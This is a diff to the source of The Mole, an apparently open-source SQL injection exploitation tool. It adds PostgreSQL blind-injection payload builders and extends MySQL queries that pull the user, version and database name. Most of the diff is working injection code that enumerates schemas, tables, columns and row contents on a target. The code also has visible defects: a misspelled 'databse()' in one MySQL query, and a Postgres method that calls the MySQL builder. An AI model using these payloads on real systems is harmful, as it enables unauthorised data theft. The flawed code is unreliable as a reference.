@@ -18,8 +18,8 @@
 # Developed by: Nasel(http://www.nasel.com.ar)
 # 
 # Authors:
-# Santiago Alessandri
 # Matías Fontanini
+# Santiago Alessandri
 # Gastón Traberg
 
 import re
@@ -287,19 +287,19 @@ class Mysql5Mole(DbmsMole):
 
     @classmethod
     def dbinfo_query(cls, columns, injectable_field):
-        return Mysql5Mole.forge_query(columns, "user(),version()", 
+        return Mysql5Mole.forge_query(columns, "user(),version(),database()", 
                "information_schema.schemata", injectable_field, offset=0)
 
     @classmethod
     def dbinfo_blind_len_query(cls, operator, value):
         return Mysql5Mole.forge_blind_len_query(
-            operator, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',user(),version())', "information_schema.schemata"
+            operator, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',user(),version(),database())', "information_schema.schemata"
         )
 
     @classmethod
     def dbinfo_blind_data_query(cls, index, value):
         return Mysql5Mole.forge_blind_query(
-            index, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',user(),version())', "information_schema.schemata"
+            index, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',user(),version(),databse())', "information_schema.schemata"
         )
 
     @classmethod
@@ -312,6 +312,11 @@ class Mysql5Mole(DbmsMole):
     
     def __str__(self):
         return "Mysql 5 Mole"
+
+
+
+# Postgres mole.
+
 
 class PostgresMole(DbmsMole):
     out_delimiter_result = "::-::"
@@ -330,6 +335,14 @@ class PostgresMole(DbmsMole):
             if i % 2 == 1:
                 cond[i] = "(" + DbmsMole.chr_join(cond[i]) + ")::unknown"
         return ''.join(cond)
+    
+    @classmethod
+    def blind_field_delimiter(cls):
+        return PostgresMole.inner_delimiter_result
+    
+    @classmethod
+    def dbms_check_blind_query(cls):
+        return '{sep} and 0 < (select length(getpgusername())) {end}'
     
     @classmethod
     def forge_query(cls, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
@@ -384,16 +397,172 @@ class PostgresMole(DbmsMole):
     @classmethod
     def table_count_query(cls, db, columns, injectable_field):
         return PostgresMole.forge_query(columns, "count(*)", 
-                    "pg_catalog.pg_tables", injectable_field,
-                    "schemaname = " + DbmsMole.chr_join(db),
+                    "information_schema.tables", injectable_field,
+                    "table_schema = " + DbmsMole.chr_join(cls._db_name(db)),
                )
 
     @classmethod
     def table_query(cls, db, columns, injectable_field, offset):
-        return PostgresMole.forge_query(columns, "tablename", 
-                    "pg_catalog.pg_tables", injectable_field,
-                    "schemaname = " + DbmsMole.chr_join(db), offset=offset
+        return PostgresMole.forge_query(columns, "table_name", 
+                    "information_schema.tables", injectable_field,
+                    "table_schema = " + DbmsMole.chr_join(cls._db_name(db)), offset=offset
                )
+
+    @classmethod
+    def columns_count_query(cls, db, table, columns, injectable_field):
+        return PostgresMole.forge_query(columns, "count(*)", 
+                    "information_schema.columns", injectable_field,
+                    where="table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
+                    " and table_name = " + DbmsMole.chr_join(table)
+               )
+
+    @classmethod
+    def columns_query(cls, db, table, columns, injectable_field, offset):
+        return PostgresMole.forge_query(columns, "column_name", 
+                    "information_schema.columns", injectable_field,
+                    "table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
+                    " and table_name = " + DbmsMole.chr_join(table), 
+                    offset
+               )
+
+    @classmethod
+    def fields_count_query(cls, db, table, columns, injectable_field, where="1=1"):
+        return PostgresMole.forge_query(columns, "count(*)", 
+                    table, injectable_field, where=where
+               )
+
+    @classmethod
+    def fields_query(cls, db, table, fields, columns, injectable_field, offset, where="1=1"):
+        return PostgresMole.forge_query(columns, ",".join(fields), 
+                    table, injectable_field,
+                    where=where,  offset=offset
+               )
+
+    @classmethod
+    def forge_blind_query(cls, index, value, fields, table, where="1=1", offset=0):
+        return '{sep} and ' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) from ' + table+' where ' + where + ' limit 1 offset '+str(offset) + '){end}'
+        
+    @classmethod
+    def forge_blind_count_query(cls, operator, value, table, where="1=1"):
+        return '{sep} and ' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+where+'){end}'
+
+    @classmethod
+    def forge_blind_len_query(cls, operator, value, field, table, where="1=1", offset=0):
+        return '{sep} and ' + str(value) + ' ' + operator + ' (select length('+field+') from '+table+' where ' + where + ' limit 1 offset '+str(offset)+'){end}'
+
+    
+    @classmethod
+    def schema_blind_count_query(cls, operator, value):
+        return PostgresMole.forge_blind_count_query(
+            operator, value, "pg_catalog.pg_database"
+        )
+
+    @classmethod
+    def schema_blind_len_query(cls, operator, value, offset, where="1=1"):
+        return PostgresMole.forge_blind_len_query(
+            operator, value, "datname", "pg_catalog.pg_database", offset=offset, where=where
+        )
+
+    @classmethod
+    def schema_blind_data_query(cls, index, value, offset, where="1=1"):
+        return PostgresMole.forge_blind_query(
+            index, value, "datname", "pg_catalog.pg_database", offset=offset, where=where
+        )
+
+    @classmethod
+    def table_blind_count_query(cls, operator, value, db):
+        return PostgresMole.forge_blind_count_query(
+            operator, value, "information_schema.tables", 
+            where="table_schema = " + DbmsMole.chr_join(cls._db_name(db))
+        )
+
+    @classmethod
+    def table_blind_len_query(cls, operator, value, db, offset):
+        return PostgresMole.forge_blind_len_query(
+            operator, value, "table_name", 
+            "information_schema.tables", offset=offset, where="table_schema = " + DbmsMole.chr_join(cls._db_name(db))
+        )
+
+    @classmethod
+    def table_blind_data_query(cls, index, value, db, offset):
+        return PostgresMole.forge_blind_query(
+            index, value, "table_name", "information_schema.tables", 
+            offset=offset, where="table_schema = " + DbmsMole.chr_join(cls._db_name(db))
+        )
+
+    @classmethod
+    def columns_blind_count_query(cls, operator, value, db, table):
+        return PostgresMole.forge_blind_count_query(
+            operator, value, "information_schema.columns", 
+            where="table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
+            " and table_name = " + DbmsMole.chr_join(table)
+        )
+
+    @classmethod
+    def columns_blind_len_query(cls, operator, value, db, table, offset):
+        return PostgresMole.forge_blind_len_query(
+            operator, value, "column_name", 
+            "information_schema.columns", offset=offset, 
+            where="table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
+            " and table_name = " + DbmsMole.chr_join(table)
+        )
+
+    @classmethod
+    def columns_blind_data_query(cls, index, value, db, table, offset):
+        return PostgresMole.forge_blind_query(
+            index, value, "column_name", "information_schema.columns", 
+            offset=offset, where="table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
+            " and table_name = " + DbmsMole.chr_join(table)
+        )
+
+    @classmethod
+    def fields_blind_count_query(cls, operator, value, table, where="1=1"):
+        return PostgresMole.forge_blind_count_query(
+            operator, value, table, 
+            where=where
+        )
+
+    @classmethod
+    def fields_blind_len_query(cls, operator, value, fields, table, offset, where="1=1"):
+        return Mysql5Mole.forge_blind_len_query(
+            operator, value, ('||' + PostgresMole.inner_delimiter + '||').join(fields), 
+            table, offset=offset, where=where
+        )
+
+    @classmethod
+    def fields_blind_data_query(cls, index, value, fields, table, offset, where="1=1"):
+        return PostgresMole.forge_blind_query(
+            index, value, ('||' + PostgresMole.inner_delimiter + '||').join(fields), 
+            table, offset=offset, where=where
+        )
+
+    @classmethod
+    def dbinfo_query(cls, columns, injectable_field):
+        return PostgresMole.forge_query(columns, "getpgusername(),version(),current_database()", 
+               "information_schema.tables", injectable_field, offset=0)
+
+    @classmethod
+    def dbinfo_blind_len_query(cls, operator, value):
+        return PostgresMole.forge_blind_len_query(
+            operator, value, 
+            '(' + ('||' + PostgresMole.inner_delimiter + '||').join(['getpgusername()', 'version()', 'current_database()']) + ')', 
+            "information_schema.schemata"
+        )
+
+    @classmethod
+    def dbinfo_blind_data_query(cls, index, value):
+        return PostgresMole.forge_blind_query(
+            index, value, 
+            '(' + ('||' + PostgresMole.inner_delimiter + '||').join(['getpgusername()', 'version()', 'current_database()']) + ')', 
+            "information_schema.schemata"
+        )
+
+    @classmethod
+    def _db_name(cls, db):
+        if db.startswith('postgres'):
+            return 'pg_catalog'
+        else:
+            return 'public'
 
     @classmethod
     def parse_results(cls, url_data):
